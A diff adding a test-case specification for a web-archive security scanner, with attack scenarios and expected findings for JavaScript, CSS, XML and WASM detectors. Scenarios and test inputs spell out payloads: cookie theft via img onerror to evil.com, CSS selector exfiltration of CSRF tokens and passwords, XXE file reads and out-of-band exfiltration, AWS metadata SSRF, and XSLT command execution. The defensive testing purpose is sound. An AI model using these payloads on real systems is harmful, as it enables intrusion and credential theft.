@@ -1,0 +1,793 @@
+================================================================================
+WEB ARCHIVE SECURITY ANALYSIS PIPELINE
+USE CASES & TEST CASES FOR EVERY SCANNER
+================================================================================
+
+For each of the 19 tests, this document provides:
+
+  USE CASE     — A real-world scenario explaining WHEN and WHY you'd care
+                 about this finding. Who is the attacker? Who is the victim?
+                 What do they gain?
+
+  TEST CASES   — Concrete inputs that SHOULD trigger findings (positive tests)
+                 and inputs that SHOULD NOT trigger findings (negative tests).
+                 Each test case has an ID, input, and expected result.
+
+  The accompanying test_cases/ directory contains actual files you can run
+  through the pipeline to verify every test.
+
+  Run: python driver.py test_cases/ --format json -o test_results.json
+
+
+================================================================================
+SECTION 1: JAVASCRIPT TESTS
+================================================================================
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 1: PROTOTYPE POLLUTION SCANNER                                  │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 1A — Library-mediated pollution in an e-commerce site
+  Scenario: An online store uses Lodash 4.17.4 and has an endpoint that
+  accepts user preferences as JSON, then merges them with defaults:
+      _.merge(defaults, userPreferences)
+  An attacker submits: {"__proto__": {"isAdmin": true}}
+  After the merge, every new object in the app has isAdmin=true. The
+  attacker accesses the admin panel, exports the customer database.
+  Who cares: Any site using deep-merge on user-controlled JSON input.
+
+USE CASE 1B — Prototype pollution to XSS via template engine
+  Scenario: A dashboard app merges user settings into a config object. The
+  template engine checks config.escapeHtml before rendering. An attacker
+  sends {"__proto__": {"escapeHtml": false}}. Now all templates render
+  raw HTML, and the attacker injects <script> tags through any text field.
+  Who cares: Single-page apps using Handlebars, Pug, or EJS templates.
+
+TEST CASES:
+  File: test_cases/js/tc01_proto_pollution.js
+
+  TC-PP-01  POSITIVE  Object.prototype.x = "value"
+            Expected: HIGH — Direct Object.prototype assignment
+
+  TC-PP-02  POSITIVE  $.extend(true, {}, userData)
+            Expected: HIGH — jQuery deep extend
+
+  TC-PP-03  POSITIVE  _.merge(config, req.body)
+            Expected: HIGH — Lodash _.merge
+
+  TC-PP-04  POSITIVE  _.defaultsDeep(options, userOpts)
+            Expected: HIGH — Lodash _.defaultsDeep
+
+  TC-PP-05  POSITIVE  obj.__proto__.polluted = 1
+            Expected: HIGH — __proto__ access
+
+  TC-PP-06  NEGATIVE  $.extend({}, defaults)
+            Expected: NO finding — shallow extend, not deep (no true arg)
+
+  TC-PP-07  NEGATIVE  Object.assign({}, source)
+            Expected: NO finding — Object.assign does not recurse
+
+  TC-PP-08  NEGATIVE  Object.freeze(Object.prototype)
+            Expected: NO finding — this is a DEFENSE, not an attack
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 2: OPEN REDIRECT SCANNER                                        │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 2A — Phishing via login redirect
+  Scenario: A bank's login page has ?redirect=/dashboard in the URL. After
+  login, it does: location.href = getParam('redirect'). An attacker sends
+  the victim: https://bank.com/login?redirect=https://evil-bank.com/login
+  The victim sees the trusted bank.com domain, logs in, gets redirected to
+  the phishing page which looks identical, and enters credentials again
+  thinking the first attempt failed.
+  Who cares: Any site with post-login redirects.
+
+USE CASE 2B — Open redirect to bypass URL whitelists
+  Scenario: An OAuth provider checks that redirect_uri starts with a
+  whitelisted domain. But the whitelisted app has an open redirect:
+  https://legit-app.com/go?url=https://evil.com. The attacker chains:
+  OAuth redirect → legit-app open redirect → evil.com with the auth token.
+  Who cares: OAuth implementations, SSO providers.
+
+TEST CASES:
+  File: test_cases/js/tc02_open_redirect.js
+
+  TC-OR-01  POSITIVE  location.href = urlParams.get('next')
+            Expected: HIGH — sink + user-controllable source nearby
+
+  TC-OR-02  POSITIVE  window.location.replace(document.referrer)
+            Expected: HIGH — sink with document.referrer source
+
+  TC-OR-03  POSITIVE  location.assign(getRedirectUrl())
+            Expected: MEDIUM — sink with function call (source unclear)
+
+  TC-OR-04  NEGATIVE  location.href = "/dashboard"
+            Expected: NO finding — static string literal
+
+  TC-OR-05  NEGATIVE  location.href = "https://example.com/page"
+            Expected: NO finding — hardcoded safe URL
+
+  TC-OR-06  POSITIVE  window.open(target_url)
+            Expected: MEDIUM — window.open with variable
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 3: HIGH-RISK BROWSER API DETECTOR                               │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 3A — Third-party script harvesting location data
+  Scenario: A news website includes an ad network script. That script calls
+  navigator.geolocation.getCurrentPosition() and sends the user's GPS
+  coordinates to the ad network's servers. The news site never consented
+  to sharing location data — the ad script does it silently.
+  Who cares: Any site with third-party scripts and privacy obligations.
+
+USE CASE 3B — WebRTC IP leak in VPN users
+  Scenario: A user browses through a VPN for privacy. A script creates a
+  new RTCPeerConnection and reads the local ICE candidates, which contain
+  the user's REAL local IP address — bypassing the VPN entirely.
+  Who cares: Privacy-conscious users, sites handling sensitive content.
+
+TEST CASES:
+  File: test_cases/js/tc03_high_risk_api.js
+
+  TC-API-01  POSITIVE  navigator.geolocation.getCurrentPosition(cb)
+             Expected: HIGH — Geolocation API
+
+  TC-API-02  POSITIVE  navigator.mediaDevices.getUserMedia({video: true})
+             Expected: HIGH — Camera access
+
+  TC-API-03  POSITIVE  new RTCPeerConnection(servers)
+             Expected: MEDIUM — WebRTC / IP leak
+
+  TC-API-04  POSITIVE  navigator.clipboard.readText()
+             Expected: HIGH — Clipboard read
+
+  TC-API-05  POSITIVE  navigator.getBattery()
+             Expected: LOW — Battery status fingerprinting
+
+  TC-API-06  NEGATIVE  console.log("navigator.geolocation")
+             Expected: Finding occurs (string match) — known false positive
+             Note: Regex-based scanners cannot distinguish comments/strings
+             from real code. This is a documented limitation.
+
+  TC-API-07  POSITIVE  navigator.bluetooth.requestDevice({})
+             Expected: MEDIUM — Web Bluetooth API
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 4: DANGEROUS SINK USAGE ANALYSIS                                │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 4A — eval() executing URL hash in a single-page app
+  Scenario: A developer builds a calculator widget. To parse expressions,
+  they use eval(location.hash.substring(1)). User visits the page with
+  #alert(document.cookie) and the XSS fires. The attacker shares the link
+  on social media and harvests session cookies from every click.
+  Who cares: Any site using eval/Function on user-reachable input.
+
+USE CASE 4B — innerHTML XSS via API response
+  Scenario: A forum app fetches a user's bio from the API and renders it:
+  profileDiv.innerHTML = response.bio. A user sets their bio to
+  <img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>.
+  Every visitor to their profile leaks their cookies.
+  Who cares: Any site rendering API data into innerHTML.
+
+USE CASE 4C — document.write in legacy analytics
+  Scenario: An old analytics snippet does document.write('<script src="' +
+  trackingUrl + '"></script>'). If trackingUrl comes from a URL parameter,
+  an attacker can inject a closing script tag and a new malicious one.
+  Who cares: Legacy sites with old inline analytics code.
+
+TEST CASES:
+  File: test_cases/js/tc04_dangerous_sinks.js
+
+  TC-DS-01  POSITIVE  eval(userInput)
+            Expected: CRITICAL — eval with variable
+
+  TC-DS-02  POSITIVE  new Function("return " + expr)
+            Expected: CRITICAL — Function constructor
+
+  TC-DS-03  POSITIVE  setTimeout(callback_string, 100)
+            Expected: HIGH — setTimeout with variable
+
+  TC-DS-04  POSITIVE  document.write('<div>' + data + '</div>')
+            Expected: HIGH — document.write
+
+  TC-DS-05  POSITIVE  el.innerHTML = serverResponse
+            Expected: HIGH — innerHTML assignment from variable
+
+  TC-DS-06  POSITIVE  el.outerHTML = template
+            Expected: HIGH — outerHTML assignment
+
+  TC-DS-07  POSITIVE  el.insertAdjacentHTML('beforeend', html)
+            Expected: MEDIUM — insertAdjacentHTML
+
+  TC-DS-08  NEGATIVE  eval("2 + 2")
+            Expected: CRITICAL — scanner cannot distinguish safe/unsafe
+            string args; finding is correct (eval is always flagged)
+
+  TC-DS-09  NEGATIVE  element.innerHTML = ""
+            Expected: NO finding — empty string literal assignment
+
+  TC-DS-10  NEGATIVE  element.textContent = userInput
+            Expected: NO finding — textContent is safe (no HTML parsing)
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 5: JSONP CALLBACK INJECTION                                     │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 5A — Cross-domain data theft via JSONP
+  Scenario: A social media API endpoint returns user data as JSONP:
+  GET /api/me?callback=handleUser returns handleUser({"name":"alice",
+  "email":"alice@company.com"}). Any website can add <script src=
+  "https://social.com/api/me?callback=steal"> and define function steal()
+  to receive the logged-in user's data — no CORS check applies because
+  it loads as a regular script.
+  Who cares: APIs still using JSONP instead of CORS.
+
+USE CASE 5B — XSS via unsanitized callback
+  Scenario: The JSONP endpoint doesn't validate the callback name:
+  GET /api?callback=alert(1)// returns alert(1)//({"data":"..."}).
+  The attacker has reflected XSS without needing any HTML injection.
+  Who cares: Any JSONP endpoint without callback sanitization.
+
+TEST CASES:
+  File: test_cases/js/tc05_jsonp.js
+
+  TC-JP-01  POSITIVE  url: "/api?callback=handler"
+            Expected: MEDIUM — JSONP callback parameter
+
+  TC-JP-02  POSITIVE  $.ajax({url: "/data", dataType: "jsonp"})
+            Expected: MEDIUM — jQuery JSONP config
+
+  TC-JP-03  POSITIVE  jsonpCallback: "myHandler"
+            Expected: MEDIUM — jQuery JSONP callback config
+
+  TC-JP-04  POSITIVE  <script src="https://api.com/data?callback=X">
+            Expected: HIGH — Script tag with JSONP endpoint
+
+  TC-JP-05  NEGATIVE  url: "/api?format=json"
+            Expected: NO finding — regular JSON, no callback
+
+  TC-JP-06  POSITIVE  fetch("/api?jsonpcallback=handle")
+            Expected: MEDIUM — JSONP parameter variant
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 6: REGEX DENIAL OF SERVICE (ReDoS)                              │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 6A — Email validation regex freezes the page
+  Scenario: A registration form validates email with the regex
+  /^([a-zA-Z0-9]+)+@/. A bot submits "aaaaaaaaaaaaaaaaaaaaaaaaa!" and
+  the browser tab freezes for 30 seconds. At scale, this is a client-side
+  DoS that makes the form unusable for all users.
+  Who cares: Any frontend with regex validation on user input.
+
+USE CASE 6B — Server-side ReDoS in Node.js
+  Scenario: A Node.js API validates input with a vulnerable regex. An
+  attacker sends a crafted string that blocks the event loop for 10
+  seconds. During that time, the entire server is unresponsive to all
+  other requests.
+  Who cares: Node.js servers using regex on untrusted input.
+
+TEST CASES:
+  File: test_cases/js/tc06_redos.js
+
+  TC-RD-01  POSITIVE  /^([a-zA-Z0-9]+)+@/
+            Expected: MEDIUM — nested quantifier (a+)+
+
+  TC-RD-02  POSITIVE  /^(a|a)+$/
+            Expected: MEDIUM — quantified alternation
+
+  TC-RD-03  POSITIVE  new RegExp("^(\\d+\\.)+$")
+            Expected: MEDIUM — nested quantifier via constructor
+
+  TC-RD-04  NEGATIVE  /^[a-zA-Z0-9]+$/
+            Expected: NO finding — single quantifier, no nesting
+
+  TC-RD-05  NEGATIVE  /^\d{3}-\d{4}$/
+            Expected: NO finding — bounded quantifiers
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 7: SERVICE WORKER SCOPE AUDIT                                   │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 7A — Persistent XSS via service worker
+  Scenario: An attacker finds an XSS on example.com and uses it to
+  register a malicious service worker at scope "/". Even after the XSS
+  is patched, the service worker persists in the victim's browser,
+  intercepting all requests, injecting malicious content, and stealing
+  credentials on every page load indefinitely.
+  Who cares: Any site that could be targeted by persistent attacks.
+
+USE CASE 7B — Cache poisoning through service worker
+  Scenario: A service worker uses a cache-first strategy with no
+  validation. An attacker poisons one cached response (e.g., via a
+  CDN compromise). The SW serves the poisoned response forever, even
+  after the CDN is cleaned.
+  Who cares: PWAs (Progressive Web Apps) with offline caching.
+
+TEST CASES:
+  File: test_cases/js/tc07_service_worker.js
+
+  TC-SW-01  POSITIVE  navigator.serviceWorker.register('/sw.js', {scope:'/'})
+            Expected: HIGH — broad scope registration
+
+  TC-SW-02  POSITIVE  navigator.serviceWorker.register('/sw.js')
+            Expected: MEDIUM — registration with default scope
+
+  TC-SW-03  POSITIVE  importScripts('https://cdn.example.com/lib.js')
+            Expected: MEDIUM — importScripts in SW context
+
+  TC-SW-04  POSITIVE  addEventListener('fetch', handler)
+            Expected: INFO — fetch event interception
+
+  TC-SW-05  NEGATIVE  // navigator.serviceWorker.register commented out
+            Expected: Finding occurs (regex matches inside comments)
+            Note: Known limitation of pattern matching approach.
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 8: CRYPTOMINER DETECTION (JavaScript)                           │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 8A — Compromised WordPress plugin mines Monero
+  Scenario: A popular WordPress caching plugin is compromised. The
+  attacker adds a Coinhive script to the plugin. 500,000 sites now mine
+  Monero for the attacker whenever a visitor loads any page. Users notice
+  their CPU at 100% and fans spinning.
+  Who cares: Website operators, users, anyone studying supply chain attacks.
+
+USE CASE 8B — Intentional mining as ad replacement
+  Scenario: A pirate streaming site adds CryptoLoot instead of ads. They
+  inform users via a small banner, but throttle is set to 80%, making the
+  user's computer unusable. In web archives, you can track when this
+  appeared and whether it was disclosed.
+  Who cares: Researchers studying consent and monetization models.
+
+TEST CASES:
+  File: test_cases/js/tc08_cryptominer.js
+
+  TC-CM-01  POSITIVE  new CoinHive.Anonymous('site-key-here')
+            Expected: CRITICAL — Coinhive initialization
+
+  TC-CM-02  POSITIVE  var m = new Client('abc123');  m.start()
+            Expected: MEDIUM — miner start pattern
+
+  TC-CM-03  POSITIVE  <script src="https://coinhive.com/lib/coinhive.min.js">
+            Expected: CRITICAL — known miner domain
+
+  TC-CM-04  POSITIVE  wss://pool.coinhive.com/proxy
+            Expected: CRITICAL — mining pool WebSocket
+
+  TC-CM-05  POSITIVE  cryptonight
+            Expected: HIGH — mining algorithm reference
+
+  TC-CM-06  NEGATIVE  // This site does NOT use cryptocurrency mining
+            Expected: NO finding — comment about mining, not mining code
+
+  TC-CM-07  NEGATIVE  var bitcoin_price = fetchPrice("BTC")
+            Expected: NO finding — cryptocurrency PRICE lookup, not mining
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 9: POSTMESSAGE HANDLER AUDIT                                    │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 9A — XSS via postMessage on an embedded payment widget
+  Scenario: A payment page embeds a card form in an iframe. The parent
+  page listens for postMessage to get the payment token. But the handler
+  does: innerHTML = event.data without checking event.origin. An attacker
+  creates a page that iframes the payment page and sends:
+  <img src=x onerror=stealCards()>. The payment page renders the
+  attacker's HTML in its own origin with access to the card form.
+  Who cares: Payment integrations, chat widgets, SSO iframes.
+
+USE CASE 9B — Bypass weak origin check
+  Scenario: A handler checks: if(event.origin.indexOf('trusted.com') > -1).
+  The attacker hosts their page on evil-trusted.com (string "trusted.com"
+  is contained) and bypasses the check entirely.
+  Who cares: Any cross-origin communication using postMessage.
+
+USE CASE 9C — Wildcard postMessage leaking tokens
+  Scenario: An iframe sends the parent a session token via:
+  parent.postMessage(token, '*'). The '*' means ANY parent origin receives
+  the token. If the user is tricked into loading the iframe on evil.com,
+  evil.com gets the token.
+  Who cares: Any site using postMessage for auth tokens or sensitive data.
+
+TEST CASES:
+  File: test_cases/js/tc09_postmessage.js
+
+  TC-PM-01  POSITIVE  addEventListener('message', fn) with NO origin check,
+            data → innerHTML
+            Expected: CRITICAL — no validation + dangerous sink
+
+  TC-PM-02  POSITIVE  addEventListener('message', fn) with NO origin check,
+            no dangerous sink
+            Expected: HIGH — no validation
+
+  TC-PM-03  POSITIVE  addEventListener('message', fn) with indexOf check
+            Expected: MEDIUM — weak origin validation
+
+  TC-PM-04  POSITIVE  postMessage(data, '*')
+            Expected: MEDIUM — wildcard target origin
+
+  TC-PM-05  NEGATIVE  addEventListener('message', fn) with === check
+            Expected: INFO — strict check (safe pattern noted)
+
+  TC-PM-06  NEGATIVE  addEventListener('click', handler)
+            Expected: NO finding — not a message listener
+
+
+================================================================================
+SECTION 2: CSS TESTS
+================================================================================
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 10: CSS ATTRIBUTE SELECTOR DATA EXFILTRATION                    │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 10A — Stealing CSRF tokens without JavaScript
+  Scenario: A banking site has strong CSP that blocks all inline scripts
+  and external script sources. But a CSS injection exists — the attacker
+  can inject arbitrary CSS into a user's profile page. They inject:
+  input[name=csrf][value^=a]{background:url(//evil.com/a)}
+  (one rule per character). When an admin views the profile, the browser
+  evaluates the selectors and makes requests that leak the admin's CSRF
+  token. The attacker uses the token to transfer funds.
+  Who cares: Sites with CSS injection even when CSP blocks JavaScript.
+
+USE CASE 10B — Exfiltrating password manager autofill
+  Scenario: A CSS injection on a login page. The password manager
+  autofills the password field. CSS selectors can probe the value:
+  input[type=password][value^=P]{background:url(//evil.com/P)}
+  The attacker learns the password character by character.
+  Who cares: Sites where password autofill occurs on injectable pages.
+
+TEST CASES:
+  File: test_cases/css/tc10_attr_exfil.css
+
+  TC-AE-01  POSITIVE  input[name=csrf][value^=a]{background:url(//evil.com/a)}
+            Expected: CRITICAL — attribute selector + external URL
+
+  TC-AE-02  POSITIVE  5+ rules with [value^=X] pattern
+            Expected: CRITICAL — bulk detection (systematic exfil)
+
+  TC-AE-03  POSITIVE  input[type=hidden][value^=tok]{list-style:url(//x.com)}
+            Expected: CRITICAL — hidden input + value probe + URL
+
+  TC-AE-04  NEGATIVE  input[type=text] { border: 1px solid red; }
+            Expected: NO finding — attribute selector but no value probing
+
+  TC-AE-05  NEGATIVE  a[href^="https://example.com"] { color: green; }
+            Expected: NO finding — href selector but no external URL
+
+  TC-AE-06  POSITIVE  [value^=a]{background-image:url(https://evil.com/a)}
+            Expected: CRITICAL — value prefix probe with URL
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 11: @IMPORT CHAIN EXFILTRATION                                  │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 11A — Single-injection-point token theft
+  Scenario: The attacker has an HTML injection (not XSS) that allows
+  injecting a <style> tag but CSP blocks scripts. They inject:
+  <style>@import '//evil.com/start'</style>
+  The evil server returns a stylesheet with @import rules that probe
+  for CSRF token characters. Each import blocks until the previous
+  character is confirmed. Over HTTP/2, the full token is leaked in
+  under 3 seconds from a single injection.
+  Who cares: Sites where HTML injection is possible but XSS is blocked.
+
+USE CASE 11B — Persistent CSS-based surveillance
+  Scenario: An attacker compromises a CSS file on a CDN. They add
+  @import rules that phone home on every page load. Even if the main
+  site's HTML is cached, the CSS file fetches fresh imports from the
+  attacker's server each time, enabling persistent tracking or data
+  exfiltration without any JavaScript.
+  Who cares: Sites relying on external CSS from third-party CDNs.
+
+TEST CASES:
+  File: test_cases/css/tc11_import_chain.css
+
+  TC-IC-01  POSITIVE  @import 'https://evil.com/start';
+            Expected: MEDIUM — single external import
+
+  TC-IC-02  POSITIVE  3+ @imports to same domain
+            Expected: HIGH — chaining pattern to same domain
+
+  TC-IC-03  POSITIVE  5+ @imports to multiple domains
+            Expected: HIGH — unusually many external imports
+
+  TC-IC-04  NEGATIVE  @import 'reset.css';
+            Expected: NO finding — local import, no external URL
+
+  TC-IC-05  NEGATIVE  @import url('https://fonts.googleapis.com/css?family=Roboto');
+            Expected: MEDIUM — external import (flagged; Google Fonts is
+            common but the scanner can't distinguish benign vs malicious)
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 12: CSS FONT LIGATURE KEYLOGGING                                │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 12A — Stealing displayed API keys
+  Scenario: A developer dashboard shows API keys in a <code> block. A
+  CSS injection lets the attacker define @font-face rules with individual
+  unicode-range values pointing to their server. When the page renders
+  the API key text, the browser loads the "font" for each character,
+  leaking the key to the attacker — all without JavaScript.
+  Who cares: Internal tools that display sensitive values in the DOM.
+
+USE CASE 12B — Leaking 2FA codes displayed on screen
+  Scenario: A TOTP setup page displays the seed in text. CSS injection
+  with font ligatures captures each character of the seed, allowing
+  the attacker to clone the user's 2FA forever.
+  Who cares: Authentication setup pages, recovery code display pages.
+
+TEST CASES:
+  File: test_cases/css/tc12_font_keylog.css
+
+  TC-FK-01  POSITIVE  @font-face with single U+0041 and external URL
+            Expected: HIGH — single-character exfil
+
+  TC-FK-02  POSITIVE  5+ @font-face blocks each with individual unicode-range
+            Expected: CRITICAL — bulk keylogging pattern
+
+  TC-FK-03  NEGATIVE  @font-face { src: url(/fonts/roboto.woff2);
+                      unicode-range: U+0000-00FF; }
+            Expected: NO finding — local URL + broad unicode range (normal)
+
+  TC-FK-04  NEGATIVE  @font-face { font-family: "Icons";
+                      src: url(https://cdn.example.com/icons.woff2); }
+            Expected: NO finding — no unicode-range specified
+
+
+================================================================================
+SECTION 3: XML TESTS
+================================================================================
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 13: XXE (XML EXTERNAL ENTITY) PATTERN DETECTION                 │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 13A — Reading /etc/passwd via XML upload
+  Scenario: A site accepts XML file uploads (invoices, data feeds). The
+  parser has external entities enabled. The attacker uploads XML with
+  <!ENTITY xxe SYSTEM "file:///etc/passwd"> and &xxe; in a text field.
+  The parsed response includes the server's password file.
+  Who cares: Any application processing XML from untrusted sources.
+
+USE CASE 13B — SSRF via XXE to access cloud metadata
+  Scenario: An AWS-hosted application parses XML. The attacker sends:
+  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/
+  security-credentials/">. The XML parser fetches the AWS metadata
+  endpoint from inside the VPC, returning IAM credentials.
+  Who cares: Cloud-hosted apps that parse external XML.
+
+USE CASE 13C — Out-of-band XXE for blind exfiltration
+  Scenario: The app parses XML but doesn't reflect the content back.
+  The attacker uses parameter entities to force the parser to connect
+  to their server: <!ENTITY % data SYSTEM "file:///etc/passwd">
+  <!ENTITY % exfil "<!ENTITY send SYSTEM 'http://evil.com/?%data;'>">
+  Even though the response is blind, the data reaches the attacker.
+  Who cares: Any XML parsing, even without visible output.
+
+TEST CASES:
+  File: test_cases/xml/tc13_xxe.xml
+
+  TC-XXE-01  POSITIVE  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+             Expected: CRITICAL — local file read
+
+  TC-XXE-02  POSITIVE  <!ENTITY ext SYSTEM "http://evil.com/data">
+             Expected: CRITICAL — external URL (SSRF)
+
+  TC-XXE-03  POSITIVE  <!ENTITY % param SYSTEM "http://evil.com/xxe.dtd">
+             Expected: CRITICAL — parameter entity (OOB exfil)
+
+  TC-XXE-04  POSITIVE  <!DOCTYPE foo SYSTEM "http://evil.com/evil.dtd">
+             Expected: HIGH — external DTD reference
+
+  TC-XXE-05  POSITIVE  &customEntity; in document body
+             Expected: MEDIUM — custom entity reference
+
+  TC-XXE-06  NEGATIVE  &amp; &lt; &gt; &quot;
+             Expected: NO finding — standard XML entities
+
+  TC-XXE-07  NEGATIVE  <data>no doctype, no entities</data>
+             Expected: NO finding — clean XML
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 14: XML BOMB / BILLION LAUGHS DETECTION                         │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 14A — Denial of service against XML API
+  Scenario: A SOAP API accepts XML requests. An attacker sends a 1KB
+  XML document with nested entities that expand to 3GB. The parser
+  allocates memory until the server runs out and crashes — taking down
+  the entire service.
+  Who cares: SOAP services, XML-based APIs, document processors.
+
+USE CASE 14B — Resource exhaustion in CI/CD pipeline
+  Scenario: A build system parses pom.xml or other XML config files
+  from pull requests. An attacker submits a PR with a Billion Laughs
+  payload in an XML file. The CI server's parser consumes all available
+  memory and the build node dies.
+  Who cares: CI/CD systems processing XML from untrusted sources.
+
+TEST CASES:
+  File: test_cases/xml/tc14_xml_bomb.xml
+
+  TC-XB-01  POSITIVE  Entity referencing 10 other entities
+            Expected: CRITICAL — exponential expansion
+
+  TC-XB-02  POSITIVE  3+ levels of entity nesting
+            Expected: CRITICAL — chain depth warning
+
+  TC-XB-03  POSITIVE  5+ entity definitions in DOCTYPE
+            Expected: MEDIUM — high entity count
+
+  TC-XB-04  NEGATIVE  <!ENTITY company "Acme Corp">
+            Expected: NO finding — single entity, no nesting
+
+  TC-XB-05  NEGATIVE  XML with no DOCTYPE at all
+            Expected: NO finding — no entities to expand
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 15: XPATH INJECTION INDICATORS                                  │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 15A — Authentication bypass in XML-based user store
+  Scenario: A legacy app stores users in XML and authenticates with
+  XPath: //user[name='$input' and pass='$input']. An attacker enters
+  name: admin' or '1'='1 and bypasses authentication, gaining access
+  as any user in the XML file.
+  Who cares: Apps using XML files for data storage with XPath queries.
+
+USE CASE 15B — Data extraction from XML via blind XPath
+  Scenario: An API builds XPath from user input. The attacker can't see
+  results directly, but can infer True/False from response behavior.
+  Using substring(), string-length(), and count() functions, they
+  extract the entire XML document character by character.
+  Who cares: Any app using XPath on user-influenced queries.
+
+TEST CASES:
+  File: test_cases/xml/tc15_xpath.xslt
+
+  TC-XP-01  POSITIVE  select="//user[$userParam]"
+            Expected: HIGH — variable in XPath predicate
+
+  TC-XP-02  POSITIVE  select with concat() function
+            Expected: HIGH — dynamic XPath construction
+
+  TC-XP-03  POSITIVE  xpath="//item[@id=$id]"
+            Expected: MEDIUM — XPath in attribute
+
+  TC-XP-04  NEGATIVE  select="//book/title"
+            Expected: NO finding — static XPath, no variables
+
+  TC-XP-05  NEGATIVE  select="."
+            Expected: NO finding — current node, harmless
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 16: XSLT INJECTION                                              │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 16A — Remote code execution via XSLT in PHP
+  Scenario: A PHP application lets users upload XSLT stylesheets for
+  custom report formatting. The attacker uploads XSLT containing:
+  <xsl:value-of select="php:function('system','cat /etc/shadow')"/>
+  The PHP XSLT processor executes the system command, and the attacker
+  reads the shadow password file.
+  Who cares: Any app that processes user-supplied XSLT.
+
+USE CASE 16B — Server-side file read via document()
+  Scenario: An XSLT template includes:
+  <xsl:value-of select="document('file:///etc/hostname')"/>
+  Even without PHP extensions, the standard document() function reads
+  XML or text files from the server filesystem.
+  Who cares: XSLT processors with default entity/document resolution.
+
+USE CASE 16C — XSS via disable-output-escaping
+  Scenario: An XSLT stylesheet generates HTML with
+  disable-output-escaping="yes" on user-controlled values. The raw
+  HTML output is not escaped, allowing script injection in the
+  transformed output.
+  Who cares: Apps generating HTML through XSLT transformation.
+
+TEST CASES:
+  File: test_cases/xml/tc16_xslt_injection.xslt
+
+  TC-XI-01  POSITIVE  document('file:///etc/passwd')
+            Expected: CRITICAL — file read via document()
+
+  TC-XI-02  POSITIVE  php:function('system', 'id')
+            Expected: CRITICAL — PHP code execution
+
+  TC-XI-03  POSITIVE  system-property('xsl:vendor')
+            Expected: MEDIUM — information disclosure
+
+  TC-XI-04  POSITIVE  document($userParam)
+            Expected: HIGH — SSRF via user-controlled param
+
+  TC-XI-05  POSITIVE  disable-output-escaping="yes"
+            Expected: HIGH — raw HTML output (XSS risk)
+
+  TC-XI-06  POSITIVE  <msxsl:script language="JScript">
+            Expected: CRITICAL — Microsoft XSLT script execution
+
+  TC-XI-07  NEGATIVE  <xsl:value-of select="title"/>
+            Expected: NO finding — safe static value-of
+
+  TC-XI-08  NEGATIVE  <xsl:template match="/">
+            Expected: NO finding — standard template
+
+
+================================================================================
+SECTION 4: WEBASSEMBLY TESTS
+================================================================================
+
+
+┌──────────────────────────────────────────────────────────────────────┐
+│ TEST 17: CRYPTOMINER DETECTION (WASM)                                │
+└──────────────────────────────────────────────────────────────────────┘
+
+USE CASE 17A — Drive-by cryptojacking on high-traffic site
+  Scenario: A news site with 10 million daily visitors embeds a WASM
+  Monero miner. The miner runs at 50% CPU throttle, and visitors stay
+  on the site for 5+ minutes reading articles. The site earns $500/day
+  in Monero while degrading every visitor's device performance.
+  Who cares: Researchers studying cryptojacking prevalence over time.
+
+USE CASE 17B — Supply chain compromise injecting WASM miner
+  Scenario: A popular JavaScript widget (live chat, social share button)
+  is compromised. The attacker adds a WASM miner that loads on every
+  site using the widget. 100,000 sites are affected within hours.
+  Who cares: Supply chain security researchers, website operators.
+
+USE CASE 17C — Tracking miner prevalence in web archives
+  Scenario: A researcher downloads 5 years of Wayback Machine snapshots
+  for the top 10,000 websites. By scanning for WASM miner signatures,
+  they plot the rise and fall of cryptojacking — peak in 2018 after
+  Coinhive launched, decline after Coinhive shut down in 2019, and any
+  resurgence with newer miners.
+  Who cares: Academic researchers, security industry analysts.
+
+TEST CASES:
+  File: test_cases/wasm/tc17_cryptominer.wasm (binary)
+  Note: Binary test cases are created by the test runner. See
+  test_runner.py for the WASM binary construction.
+
+  TC-WM-01  POSITIVE  WASM binary containing "cryptonight" string
+            Expected: HIGH — mining algorithm signature
+
+  TC-WM-02  POSITIVE  WASM binary containing "CoinHive" string
+            Expected: CRITICAL — known miner brand
+
+  TC-WM-03  POSITIVE  WASM binary with 3+ mining-related strings
+            Expected: CRITICAL — strong indicator
+
+  TC-WM-04  POSITIVE  WASM binary > 500KB
+            Expected: LOW — size heuristic
+
+  TC-WM-05  NEGATIVE  Valid WASM binary with no mining strings, small size
+            Expected: INFO only — valid WASM metadata
+
+
+================================================================================
+END OF USE CASES AND TEST CASES
+================================================================================
